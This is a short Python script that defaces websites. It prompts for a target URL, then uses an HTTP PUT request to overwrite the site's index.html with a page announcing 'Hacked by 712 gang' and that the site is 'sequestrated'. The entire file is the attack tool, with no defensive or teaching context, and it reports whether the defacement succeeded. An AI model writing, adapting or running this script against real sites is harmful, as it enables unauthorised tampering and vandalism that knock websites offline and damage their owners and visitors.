import requests

# Prompt the user for the website URL
url = input("Enter the website URL to sequestrate: ")

# HTML code to replace the homepage
hack_html = '''
<html>
<head>
  <title>Sequestrated Website</title>
</head>
<body>
  <h1>Hacked by 712 gang</h1>
  <p>Your website has been sequestrated and is no longer accessible.</p>
</body>
</html>
'''

# Upload the hacked HTML to the website
upload_url = url + '/index.html'
response = requests.put(upload_url, data=hack_html)

# Check if the upload was successful
if response.status_code == 200:
    print('Website successfully sequestrated!')
else:
    print('Failed to sequestrate website.')